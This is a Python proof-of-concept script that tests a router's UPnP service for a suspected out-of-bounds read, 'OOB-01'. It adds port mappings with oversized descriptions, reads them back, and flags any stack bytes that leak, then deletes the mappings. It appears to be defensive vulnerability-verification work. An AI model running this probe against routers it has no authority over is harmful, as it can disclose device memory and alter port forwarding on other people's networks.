#!/usr/bin/env python3
"""
OOB-01 real-router MATRIX test (Python 3 only, no extra libraries).

Why this exists: oob01_real_router_test.py sent ONE description length (200)
and read it back with ONE command (GetSpecificPortMappingEntry). On a real
unit that returned 63 'A's -- clean truncation, no leak. That alone does not
prove the bug is absent: the read-back buffers are 64 bytes (Specific) and
40 bytes (Generic) in the 16.00.0 code, and whether strncpy leaves the buffer
unterminated depends on the exact length boundary and on what the stack holds
right after the buffer. This script tries many lengths around those
boundaries and reads each one back with BOTH read commands.

Each case uses its own external port (55130 + case number) so the cases do
not overwrite each other. All rules get lease 120s and are also deleted at
the end (DeletePortMapping), so nothing is left behind.

Run (on the PC's REAL LAN, not WSL2-NAT):  python oob01_matrix_test.py
Optional: python oob01_matrix_test.py 192.168.0.1 5000   (skip SSDP: router IP and UPnP port)

Verdicts printed per (length, read command):
  LEAK      returned value longer than the buffer, or has non-'A' bytes
            -> the OOB-01 information leak reproduced on this unit.
  BOUNDARY  returned exactly the full buffer (40/64) of 'A', nothing extra
            -> unterminated but followed by a zero byte by luck; re-run
               later / other lengths, the stack content may differ.
  CLEAN     returned fewer 'A' than sent, shorter than the buffer
            -> terminated properly (or truncated on store).
  FULL      returned everything sent -> value stored/returned untruncated
            (this read path does not use the small buffer).
  ERROR     router rejected the request (message shown).
"""
import re
import socket
import sys
import time

BASE_PORT = 55130
LENGTHS = [20, 39, 40, 41, 63, 64, 65, 80, 128, 200, 400, 800]
BUF = {"Specific": 64, "Generic": 40}   # read-back buffer sizes from the static analysis
MARK = "A"


def discover_router():
    print("[SSDP] Looking for a UPnP router...")
    msg = ("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
           'MAN: "ssdp:discover"\r\nMX: 2\r\n'
           "ST: urn:schemas-upnp-org:service:WANIPConnection:1\r\n\r\n").encode()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    sock.sendto(msg, ("239.255.255.250", 1900))
    end = time.time() + 3
    while time.time() < end:
        try:
            data, _ = sock.recvfrom(4096)
        except socket.timeout:
            break
        m = re.search(r"LOCATION:\s*http://([\d.]+):(\d+)/", data.decode(errors="replace"), re.I)
        if m:
            return m.group(1), int(m.group(2))
    return None, None


def my_ip_towards(router_ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((router_ip, 9))
    ip = s.getsockname()[0]
    s.close()
    return ip


def soap(ip, port, action, body):
    env = ('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
           's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
           + body + "</s:Body></s:Envelope>")
    req = (f"POST /ctl/IPConn HTTP/1.1\r\nHost: {ip}:{port}\r\n"
           'Content-Type: text/xml; charset="utf-8"\r\n'
           f"Content-Length: {len(env)}\r\n"
           f'SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#{action}"\r\n'
           "Connection: close\r\n\r\n" + env)
    with socket.create_connection((ip, port), timeout=5) as s:
        s.sendall(req.encode())
        chunks = []
        while True:
            c = s.recv(4096)
            if not c:
                break
            chunks.append(c)
    # latin-1 keeps every raw byte visible (leaked bytes may not be valid UTF-8)
    return b"".join(chunks).decode("latin-1")


NS = 'xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"'


def add(ip, port, ext, my_ip, desc):
    body = (f"<u:AddPortMapping {NS}><NewRemoteHost></NewRemoteHost>"
            f"<NewExternalPort>{ext}</NewExternalPort><NewProtocol>TCP</NewProtocol>"
            f"<NewInternalPort>{ext}</NewInternalPort><NewInternalClient>{my_ip}</NewInternalClient>"
            f"<NewEnabled>1</NewEnabled><NewPortMappingDescription>{desc}</NewPortMappingDescription>"
            "<NewLeaseDuration>120</NewLeaseDuration></u:AddPortMapping>")
    return soap(ip, port, "AddPortMapping", body)


def get_specific(ip, port, ext):
    body = (f"<u:GetSpecificPortMappingEntry {NS}><NewRemoteHost></NewRemoteHost>"
            f"<NewExternalPort>{ext}</NewExternalPort><NewProtocol>TCP</NewProtocol>"
            "</u:GetSpecificPortMappingEntry>")
    return soap(ip, port, "GetSpecificPortMappingEntry", body)


def get_generic(ip, port, ext):
    """Walk GetGenericPortMappingEntry by index until we find our external port."""
    last = ""
    for idx in range(0, 64):
        body = (f"<u:GetGenericPortMappingEntry {NS}><NewPortMappingIndex>{idx}</NewPortMappingIndex>"
                "</u:GetGenericPortMappingEntry>")
        last = soap(ip, port, "GetGenericPortMappingEntry", body)
        if "<NewExternalPort>" not in last:
            return last  # past the end of the list (SpecifiedArrayIndexInvalid) or error
        m = re.search(r"<NewExternalPort>(\d+)</NewExternalPort>", last)
        if m and int(m.group(1)) == ext:
            return last
    return last


def delete(ip, port, ext):
    body = (f"<u:DeletePortMapping {NS}><NewRemoteHost></NewRemoteHost>"
            f"<NewExternalPort>{ext}</NewExternalPort><NewProtocol>TCP</NewProtocol>"
            "</u:DeletePortMapping>")
    try:
        soap(ip, port, "DeletePortMapping", body)
    except OSError:
        pass


def judge(resp, sent_len, bufsize):
    m = re.search(r"<NewPortMappingDescription>(.*?)</NewPortMappingDescription>", resp, re.S)
    if not m:
        err = re.search(r"<errorDescription>(.*?)</errorDescription>", resp, re.S)
        first = resp.splitlines()[0] if resp else "(no reply)"
        return "ERROR", (err.group(1) if err else first), ""
    v = m.group(1)
    extra = v.replace(MARK, "")
    if extra or len(v) > bufsize:
        return "LEAK", f"{len(v)} chars, {len(extra)} non-'{MARK}' bytes", v
    if len(v) == sent_len:
        return "FULL", f"{len(v)} chars (all sent bytes returned)", v
    if len(v) == bufsize:
        return "BOUNDARY", f"{len(v)} chars = full buffer, no extra bytes", v
    return "CLEAN", f"{len(v)} chars (sent {sent_len})", v


def main():
    if len(sys.argv) == 3:
        ip, port = sys.argv[1], int(sys.argv[2])
    else:
        ip, port = discover_router()
    if ip is None:
        print("No UPnP router found (UPnP off? different subnet? WSL2 NAT? PC firewall?).")
        sys.exit(1)
    my_ip = my_ip_towards(ip)
    print(f"Router {ip}:{port}   this PC {my_ip}\n")
    print(f"{'len':>5} {'reader':<9} {'verdict':<9} detail")
    print("-" * 72)

    leaks = []
    ports = []
    for i, n in enumerate(LENGTHS):
        ext = BASE_PORT + i
        ports.append(ext)
        try:
            r = add(ip, port, ext, my_ip, MARK * n)
        except OSError as e:
            print(f"{n:>5} {'(add)':<9} {'ERROR':<9} {e}")
            continue
        if "AddPortMappingResponse" not in r:
            first = r.splitlines()[0] if r else "(no reply)"
            err = re.search(r"<errorDescription>(.*?)</errorDescription>", r, re.S)
            print(f"{n:>5} {'(add)':<9} {'ERROR':<9} rejected: {err.group(1) if err else first}")
            continue
        for name, fn in (("Specific", get_specific), ("Generic", get_generic)):
            try:
                resp = fn(ip, port, ext)
            except OSError as e:
                print(f"{n:>5} {name:<9} {'ERROR':<9} {e}")
                continue
            verdict, detail, val = judge(resp, n, BUF[name])
            print(f"{n:>5} {name:<9} {verdict:<9} {detail}")
            if verdict == "LEAK":
                leaks.append((n, name, val))

    for ext in ports:
        delete(ip, port, ext)

    print("\nCleanup: DeletePortMapping sent for ports "
          f"{ports[0]}-{ports[-1]} (rules also expire after 120s).")
    print()
    if leaks:
        print("=== RESULT: LEAK reproduced on this router ===")
        for n, name, val in leaks:
            extra = val.replace(MARK, "")
            print(f"  len={n} via {name}: extra bytes (repr, first 120): {extra[:120]!r}")
        print("Save this whole output as evidence.")
    else:
        print("=== RESULT: no leak in any case ===")
        print("Not reproduced on this unit with these lengths/readers. Before concluding")
        print("'not vulnerable', check the firmware version is 16.00.0 and re-run once or")
        print("twice (stack contents after the buffer can differ between runs).")


if __name__ == "__main__":
    main()
